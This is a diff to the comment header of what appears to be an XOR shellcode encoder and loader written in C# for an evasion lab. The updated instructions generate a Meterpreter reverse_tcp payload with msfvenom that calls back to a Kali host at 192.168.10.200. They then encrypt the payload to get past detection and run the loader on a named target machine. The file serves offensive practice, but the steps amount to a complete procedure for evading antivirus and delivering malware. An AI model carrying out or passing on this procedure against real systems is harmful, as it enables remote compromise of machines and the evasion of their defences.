@@ -36,20 +36,23 @@
 //   - Document: 06_encoding_evasion.md
 //
 // BUILD INSTRUCTIONS:
-//   Compile the encoder:
-//     csc /out:xor_encode.exe 02_xor_encoder.cs /define:ENCODER
-//   Compile the loader:
-//     csc /unsafe /out:xor_loader.exe 02_xor_encoder.cs
+//   On Dev Box (ammulu, 192.168.10.150):
+//     Compile the encoder:
+//       csc /out:xor_encode.exe 02_xor_encoder.cs /define:ENCODER
+//     Compile the loader:
+//       csc /unsafe /out:xor_loader.exe 02_xor_encoder.cs
 //
 // USAGE:
-//   Step 1 - Generate raw shellcode on Kali:
-//     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o payload.bin
+//   Step 1 - Generate raw shellcode on Kali (192.168.10.200):
+//     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.200 LPORT=<PORT> -f raw -o payload.bin
 //
-//   Step 2 - Encrypt the shellcode (can run on Kali or Windows):
+//   Step 2 - Transfer payload.bin to Dev Box (ammulu) and encrypt:
 //     xor_encode.exe payload.bin encrypted.bin
 //     (This prints the XOR key. Save it.)
 //
-//   Step 3 - Run the loader on Windows 11 target:
+//   Step 3 - Transfer xor_loader.exe and encrypted.bin to Target (kimjongun, 192.168.10.100).
+//
+//   Step 4 - Run the loader on Target:
 //     xor_loader.exe encrypted.bin <XOR_KEY_HEX>
 //
 // ============================================================================
